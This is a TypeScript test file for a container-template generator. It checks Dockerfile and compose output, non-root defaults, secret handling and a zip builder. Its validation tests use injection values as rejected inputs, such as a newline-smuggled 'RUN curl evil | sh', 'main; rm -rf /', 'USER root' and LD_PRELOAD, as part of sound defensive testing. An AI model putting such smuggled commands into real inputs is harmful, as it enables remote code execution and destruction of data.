/**
 * Container templates: every stack produces a complete, safe file set; invalid forms produce errors and no files;
 * no field can inject extra Dockerfile or compose lines; secrets never reach a file.
 */
import { defaultConfig, generateContainerFiles, validate, type ContainerConfig, type ContainerStack } from '@/lib/engines/containers/dockerTemplates';
import { buildZip, crc32 } from '@/lib/engines/containers/zip';

const STACKS: ContainerStack[] = ['node', 'python', 'java', 'static'];
const gen = (over: Partial<ContainerConfig> = {}, stack: ContainerStack = 'node') => {
  const r = generateContainerFiles({ ...defaultConfig(stack), ...over });
  if (!r.ok) throw new Error(r.errors.join('; '));
  return Object.fromEntries(r.files.map((f) => [f.path, f.content]));
};

describe('every stack', () => {
  test.each(STACKS)('%s: default form gives the full file set', (stack) => {
    const f = gen({}, stack);
    expect(Object.keys(f)).toEqual(expect.arrayContaining(['Dockerfile', '.dockerignore', 'docker-compose.yml', '.env.example', 'README.md']));
    expect('nginx.conf' in f).toBe(stack === 'static');
    expect(f['Dockerfile']).toMatch(/^# syntax=docker\/dockerfile:1/);
    expect(f['Dockerfile']).toMatch(/HEALTHCHECK/);
    // non-root by default (the static image is nginx-unprivileged, which is already non-root)
    if (stack !== 'static') expect(f['Dockerfile']).toMatch(/\nUSER app\n/);
    expect(f['Dockerfile']).toMatch(/EXPOSE \d+/);
  });
  test.each(['node', 'python', 'java'] as ContainerStack[])('%s: turning non-root off is flagged in the file', (stack) => {
    const f = gen({ runAsNonRoot: false }, stack);
    expect(f['Dockerfile']).not.toMatch(/\nUSER /);
    expect(f['Dockerfile']).toContain('WARNING');
  });
});

describe('stack specifics', () => {
  test('node standalone runs server.js; otherwise the start command', () => {
    expect(gen({ nextStandalone: true })['Dockerfile']).toContain('"node server.js"');
    expect(gen({ startCommand: 'node dist/main.js' })['Dockerfile']).toContain('"node dist/main.js"');
  });
  test('pnpm and yarn use their lockfiles', () => {
    expect(gen({ packageManager: 'pnpm' })['Dockerfile']).toContain('pnpm-lock.yaml');
    expect(gen({ packageManager: 'yarn' })['Dockerfile']).toContain('yarn.lock');
  });
  test('python framework decides the server', () => {
    expect(gen({ pythonFramework: 'fastapi', pythonModule: 'app.main:app' }, 'python')['Dockerfile']).toContain('uvicorn app.main:app');
    expect(gen({ pythonFramework: 'django', pythonModule: 'config' }, 'python')['Dockerfile']).toContain('gunicorn config.wsgi:application');
    expect(gen({ pythonFramework: 'flask', pythonModule: 'wsgi:app' }, 'python')['Dockerfile']).toContain('gunicorn wsgi:app');
  });
  test('java picks the build tool', () => {
    expect(gen({ javaBuildTool: 'maven' }, 'java')['Dockerfile']).toContain('mvn');
    expect(gen({ javaBuildTool: 'gradle' }, 'java')['Dockerfile']).toContain('bootJar');
  });
  test('static site: SPA fallback and the build folder', () => {
    const f = gen({ staticBuildDir: 'build', staticSpaFallback: true }, 'static');
    expect(f['nginx.conf']).toContain('/index.html');
    expect(f['Dockerfile']).toContain('/app/build');
    expect(gen({ staticSpaFallback: false }, 'static')['nginx.conf']).toContain('=404');
  });
});

describe('compose', () => {
  test('postgres and redis are added with health-gated start-up', () => {
    const c = gen({ postgres: true, redis: true })['docker-compose.yml'];
    expect(c).toContain('postgres:16-alpine');
    expect(c).toContain('redis:7-alpine');
    expect(c).toContain('condition: service_healthy');
    expect(c).toContain('POSTGRES_PASSWORD:?set POSTGRES_PASSWORD');
    expect(c).toContain('REDIS_URL');
    expect(c).toContain('pgdata:');
  });
  test('limits and restart policy come from the form', () => {
    const c = gen({ memoryLimit: '1g', cpuLimit: '2', restart: 'always' })['docker-compose.yml'];
    expect(c).toContain('mem_limit: 1g');
    expect(c).toContain('cpus: 2');
    expect(c).toContain('restart: always');
  });
  test('a secret variable never has its value written anywhere', () => {
    const f = gen({ env: [{ key: 'API_TOKEN', value: 'super-secret-value', secret: true }, { key: 'LOG_LEVEL', value: 'info' }] });
    for (const content of Object.values(f)) expect(content).not.toContain('super-secret-value');
    expect(f['docker-compose.yml']).toContain('API_TOKEN: "${API_TOKEN:?set API_TOKEN}"');
    expect(f['.env.example']).toMatch(/^API_TOKEN=$/m);
    expect(f['.env.example']).toContain('LOG_LEVEL=info');
  });
  test('a literal $ in a value is doubled for compose and the YAML stays valid', () => {
    const c = gen({ env: [{ key: 'PRICE', value: 'a$b "q"' }] })['docker-compose.yml'];
    expect(c).toContain('PRICE: "a$$b \\"q\\""');
  });
});

describe('validation', () => {
  const bad = (over: Partial<ContainerConfig>, stack: ContainerStack = 'node') => validate({ ...defaultConfig(stack), ...over });
  test('default forms are valid', () => { for (const s of STACKS) expect(bad({}, s)).toEqual([]); });
  test.each([
    ['name with spaces', { appName: 'my app' }],
    ['uppercase name', { appName: 'MyApp' }],
    ['port 0', { port: 0 }],
    ['port 70000', { port: 70000 }],
    ['unknown version', { version: '9' }],
    ['health path without slash', { healthPath: 'health' }],
    ['health path with quote', { healthPath: '/a"b' }],
    ['memory without unit', { memoryLimit: '512' }],
    ['zero cpu', { cpuLimit: '0' }],
    ['newline in start command', { startCommand: 'npm start\nRUN curl evil | sh' }],
    ['newline in build command', { buildCommand: 'npm run build\nUSER root' }],
    ['bad env name', { env: [{ key: '1BAD', value: 'x' }] }],
    ['reserved env name', { env: [{ key: 'LD_PRELOAD', value: 'x' }] }],
    ['duplicate env name', { env: [{ key: 'A', value: '1' }, { key: 'A', value: '2' }] }],
    ['newline in env value', { env: [{ key: 'A', value: 'x\nB=y' }] }],
  ] as Array<[string, Partial<ContainerConfig>]>)('rejects %s', (_n, over) => {
    expect(bad(over).length).toBeGreaterThan(0);
    expect(generateContainerFiles({ ...defaultConfig('node'), ...over }).ok).toBe(false);
  });
  test('static: privileged port and path escape are rejected; python module must look like module:app', () => {
    expect(bad({ port: 80 }, 'static').length).toBeGreaterThan(0);
    expect(bad({ staticBuildDir: '../x' }, 'static').length).toBeGreaterThan(0);
    expect(bad({ pythonFramework: 'fastapi', pythonModule: 'main; rm -rf /' }, 'python').length).toBeGreaterThan(0);
  });
  test('a command with quotes and $ stays inside its JSON string', () => {
    const d = gen({ startCommand: 'node server.js --name "a $HOME"' })['Dockerfile'];
    expect(d).toContain('CMD ["sh", "-c", "node server.js --name \\"a $HOME\\""]');
  });
});

describe('zip', () => {
  test('crc32 of "123456789" is the standard check value', () => {
    expect(crc32(new TextEncoder().encode('123456789'))).toBe(0xcbf43926);
  });
  test('archive has local, central and end records with every file', () => {
    const files = [{ path: 'Dockerfile', content: 'FROM x\n' }, { path: 'a/b.txt', content: 'héllo' }];
    const z = buildZip(files, 'app');
    const dv = new DataView(z.buffer);
    expect(dv.getUint32(0, true)).toBe(0x04034b50);
    expect(dv.getUint32(z.length - 22, true)).toBe(0x06054b50);
    expect(dv.getUint16(z.length - 22 + 10, true)).toBe(2);
    const text = new TextDecoder().decode(z);
    expect(text).toContain('app/Dockerfile');
    expect(text).toContain('app/a/b.txt');
  });
});
